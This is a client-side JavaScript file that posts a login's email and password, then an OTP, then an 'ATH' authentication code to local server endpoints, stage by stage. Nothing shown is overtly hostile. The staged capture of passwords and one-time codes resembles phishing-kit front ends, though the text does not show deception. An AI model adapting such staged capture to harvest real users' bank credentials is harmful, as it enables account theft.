// script.js

let userEmail = ''; // Variable to store email after login

// Handle login form submission
document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Get the email and password
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    try {
        // Send email and password to the server
        const response = await fetch('http://localhost:5000/submit-login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });

        // Check if the response is ok
        if (!response.ok) {
            const errorText = await response.text(); // Get the error response as text
            console.error('Error response:', errorText); // Log the error response
            throw new Error(`Network response was not ok: ${errorText}`);
        }

        const result = await response.json();
        if (result.success) {
            userEmail = email; // Store the email for later use
            document.getElementById("login-form").style.display = "none"; // Hide login form
            document.getElementById("otp-form").style.display = "block"; // Show OTP form
        } else {
            alert(result.message || 'Login failed. Please try again.'); // Alert for unsuccessful login
        }
    } catch (error) {
        console.error('Error during login:', error);
        alert('An error occurred: ' + error.message); // Display the error message
    }
});

// Handle OTP form submission
document.getElementById("otpForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Get the OTP
    const otp = document.getElementById("otp").value;

    try {
        // Send OTP and email to the server
        const response = await fetch('http://localhost:5000/submit-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: userEmail, otp }) // Include stored email
        });

        // Check if the response is ok
        if (!response.ok) {
            const errorText = await response.text(); // Get the error response as text
            console.error('Error response:', errorText); // Log the error response
            throw new Error(`Network response was not ok: ${errorText}`);
        }

        const result = await response.json();
        if (result.success) {
            document.getElementById("otp-form").style.display = "none"; // Hide OTP form
            document.getElementById("ath-form").style.display = "block"; // Show ATH form
        } else {
            alert(result.message || 'OTP verification failed. Please try again.');
        }
    } catch (error) {
        console.error('Error during OTP submission:', error);
        alert('An error occurred: ' + error.message);
    }
});

// Handle ATH form submission
document.getElementById("athForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Get the ATH
    const ath = document.getElementById("ath").value;

    try {
        // Send ATH and email to the server
        const response = await fetch('http://localhost:5000/submit-ath', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: userEmail, ath }) // Include stored email
        });

        // Check if the response is ok
        if (!response.ok) {
            const errorText = await response.text(); // Get the error response as text
            console.error('Error response:', errorText); // Log the error response
            throw new Error(`Network response was not ok: ${errorText}`);
        }

        const result = await response.json();
        if (result.success) {
            alert(result.message || 'Authentication Code submitted successfully!');
            // Optionally, redirect the user or perform other actions here
            // For example:
            // window.location.href = '/dashboard';
        } else {
            alert(result.message || 'Authentication Code verification failed. Please try again.');
        }
    } catch (error) {
        console.error('Error during Authentication Code submission:', error);
        alert('An error occurred: ' + error.message);
    }
});
